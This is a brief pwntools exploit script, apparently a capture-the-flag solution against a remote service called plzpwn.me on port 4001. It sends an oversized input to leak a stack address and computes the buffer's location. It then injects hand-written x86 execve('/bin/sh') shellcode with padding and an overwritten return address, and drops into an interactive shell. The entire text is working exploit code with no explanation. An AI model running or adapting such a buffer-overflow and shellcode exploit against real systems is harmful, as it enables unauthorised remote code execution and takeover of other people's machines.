from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


execve = """
    mov eax, 0xb;
    push 6845231;
    push 1852400175;
    mov ebx, esp;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""


p = remote("plzpwn.me","4001")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("A"*0x50)
print p.recvuntil("offset ")
address = p.recv(10)
vul = int(address, 16) - 158
print(address)
log.info("start of buffer: " + hex(vul))

p.sendline("1")
payload = asm(execve)
fill = 54 - len(payload)
p.sendline(payload + '\0'*fill + p32(vul))
print p.recv()
p.interactive()
